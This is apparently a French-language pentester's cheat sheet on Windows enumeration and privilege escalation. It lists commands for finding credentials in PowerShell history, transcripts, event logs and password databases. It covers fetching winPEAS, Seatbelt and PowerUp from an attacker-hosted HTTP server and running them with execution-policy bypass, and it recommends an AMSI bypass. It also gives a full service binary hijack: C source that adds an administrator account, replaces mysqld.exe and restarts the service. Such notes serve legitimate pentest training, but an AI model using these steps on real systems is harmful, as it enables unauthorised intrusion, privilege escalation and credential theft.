# Windows

## Outils

* Mimikatz
* [winPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)
* [LOLBAS](https://lolbas-project.github.io)

## Enumerating Windows

### Enumération manuelle

**Username et hostname**
```cmd
whoami
```

**Groupes de l'utilisateur courant**
```cmd
whoami /groups
```

**Utilisateurs locaux**
```powershell
Get-LocalUser
```

```cmd
net user
net user <username>
```

**Groupes locaux**
```powershell
Get-LocalGroup
```

```cmd
net localgroup
```

**Membres d'un groupe**
```powershell
Get-LocalGroupMember <groupname>
```

**OS, version et architecture**
```cmd
systeminfo
```

**Interfaces réseau**
```cmd
ipconfig /all
```

**Table de routage**
```cmd
route print
```

**Connexions réseau actives**
```cmd
netstat -ano
```

**Applications installées (32-bit et 64-bit)**
```powershell
# 32bits
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

# 64bits
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

```cmd
dir "C:\Program Files"
dir "C:\Program Files (x86)"
dir C:\Users\<user>\Downloads
```

**Processus en cours d'exécution**
```powershell
Get-Process

# Process non standard Windows
Get-Process | Where-Object {$_.Path -notlike "C:\Windows\*" -and $_.Path -ne $null} | Select-Object Id, Name, Path, CPU, WS

# Path du binaire derrière le process
Get-Process NonStandardProcess | Select-Object Path
```

**Recherche de fichiers sensibles par extension**
```powershell
# Password manager databases
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

# Fichiers de config et texte dans un répertoire applicatif
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue

# Documents dans le home de l'utilisateur
Get-ChildItem -Path C:\Users\<user>\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue

Get-ChildItem -Path C:\Users\ -Include *.ini -File -Recurse -ErrorAction SilentlyContinue

# CMD
dir /s /b /a C:\*.txt
```

**Lire un fichier**
```powershell
# Aliases pour Get-Content
cat C:\path\to\file.txt
type C:\path\to\file.txt
gc C:\path\to\file.txt
Get-Content C:\path\to\file.txt
```

```cmd
type C:\path\to\file.txt
```

**Exécuter une commande en tant qu'un autre utilisateur**

Nécessite un accès GUI (RDP ou session physique) - le prompt de mot de passe n'accepte pas l'input depuis un bind shell ou WinRM.

```cmd
runas /user:<username> cmd
```

**Historique PowerShell (Get-History)**

Ne contient que les commandes de la session courante, effacé par `Clear-History`.

```powershell
Get-History
```

**Historique PSReadline**

Non effacé par `Clear-History` - contient l'historique persistant entre les sessions.

```powershell
(Get-PSReadlineOption).HistorySavePath
type C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

**Transcripts PowerShell**

Enregistrent toutes les commandes et leur output, peuvent contenir des credentials en clair.

```powershell
type C:\Users\Public\Transcripts\transcript01.txt
```

**Se connecter en WinRM avec des credentials**

Équivalent Windows de SSH, basé sur HTTP/HTTPS, port 5985 (HTTP) ou 5986 (HTTPS).

```powershell
$password = ConvertTo-SecureString "<password>" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("<username>", $password)
Enter-PSSession -ComputerName <host> -Credential $cred
```

```bash
evil-winrm -i <ip> -u '<username>' -p '<password>'
download fichier
upload fichier
```

**Event Viewer**

Logs les scripts PowerShell exécutés. Dans l'Event Viewer : `Applications and Services Logs > Microsoft > Windows > PowerShell > Operational`, filtrer par Event ID 4104. Chercher des mots de passe dans les entrées.

```powershell
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" | Where-Object {$_.Id -eq 4104} | Select-Object TimeCreated, Message | Format-List
```


### Enumération automatique

#### winPEAS

Peut être bloqué par l'AV. Alternatives : Seatbelt, JAWS. Ne remplace pas l'énumération manuelle (peut rater des fichiers, mal identifier l'OS, etc.).

Formats disponibles sur Kali dans `/usr/share/peass/winpeas/` :

| Format | Avantages | Inconvénients |
|--------|-----------|---------------|
| `.exe` | Plus complet, standalone | Détecté facilement par AV |
| `.ps1` | Flexible, AMSI peut être bypassé | AMSI, politique d'exécution restrictive |
| `.bat` | Furtif, pas de dépendances | Très limité en fonctionnalités |

AMSI (Antimalware Scan Interface) : interface Windows qui permet aux AV de scanner les scripts PowerShell en mémoire avant exécution, même obfusqués.

Recommandation pentest : `.ps1` avec bypass AMSI si l'AV est un obstacle, sinon `.exe` pour les résultats les plus complets.

```bash
# Kali : copier le binaire et servir via HTTP
cp /usr/share/peass/winpeas/winPEASx64.exe .
python3 -m http.server 80
```

```powershell
# Cible : télécharger et exécuter
iwr -uri http://<ip>/winPEASx64.exe -Outfile winPEAS.exe
.\winPEAS.exe

.\winpeas.exe > output.txt
.\winpeas.exe | Tee-Object -FilePath output.txt
```

#### Seatbelt

Compiler sur une machine Windows avec VS Build Tools, transférer le binaire sur la cible.

```cmd
# Prérequis sur la machine de compilation
winget install Microsoft.VisualStudio.2022.BuildTools
git clone https://github.com/GhostPack/Seatbelt.git
cd Seatbelt
msbuild Seatbelt.sln /p:Configuration=Release
```

```powershell
# Cible : télécharger et exécuter
iwr -uri http://<ip>/Seatbelt.exe -Outfile Seatbelt.exe
.\Seatbelt.exe -group=all
.\Seatbelt.exe -group=all > output.txt
```

**si .NET 3.5 absent sur la cible**

Recompiler en ciblant .NET 4.x. Vérifier la version disponible sur la machine de compilation, modifier `Seatbelt\Seatbelt.csproj`, puis recompiler.

```cmd
# Vérifier les versions .NET disponibles
winget install Microsoft.DotNet.Framework.DeveloperPack_4
dir "C:\Program Files (x86)\Reference Assemblies\Microsoft\Framework\.NETFramework\"
```

```xml
<!-- Seatbelt.csproj : modifier la ligne TargetFrameworkVersion -->
<TargetFrameworkVersion>v4.8.1</TargetFrameworkVersion>
```

```cmd
msbuild Seatbelt.sln /p:Configuration=Release
```

## Windows Services

### Service Binary Hijacking

**Lister les services en cours avec leur binaire**

```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```

**Vérifier les permissions sur un binaire de service**

Masks : `F` = Full, `M` = Modify, `RX` = Read+Execute, `R` = Read, `W` = Write.

```cmd
icacls "C:\xampp\mysql\bin\mysqld.exe"
```

**Créer un binaire malveillant (ajoute un user admin)**

```c
#include <stdlib.h>
int main() {
  system("net user dave2 password123! /add");
  system("net localgroup administrators dave2 /add");
  return 0;
}
```

```bash
# Compiler sur Kali
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
python3 -m http.server 80
```

**Remplacer le binaire et déclencher l'exécution**

```powershell
iwr -uri http://<ip>/adduser.exe -Outfile adduser.exe
move C:\xampp\mysql\bin\mysqld.exe mysqld.exe        # backup
move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe

# Redémarrer le service (si permissions suffisantes)
net stop mysql
net start mysql
```

**Vérifier le Startup Type et les privilèges de reboot**

Si le service est `Auto`, un reboot suffit. Vérifier `SeShutdownPrivilege`.

```powershell
Get-CimInstance -ClassName win32_service | Select Name,StartMode | Where-Object {$_.Name -like 'mysql'}
whoami /priv
shutdown /r /t 0
```

**Vérifier que l'exploitation a fonctionné**

```powershell
Get-LocalGroupMember administrators
```

**PowerUp - détecter les binaires de service modifiables**

```bash
cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
python3 -m http.server 80
```

```powershell
iwr -uri http://<ip>/PowerUp.ps1 -Outfile PowerUp.ps1
powershell -ep bypass
. .\PowerUp.ps1
Get-ModifiableServiceFile
```

Si l'AbuseFunction échoue (ex: argument avec chemin dans le PathName), faire l'exploitation manuellement.
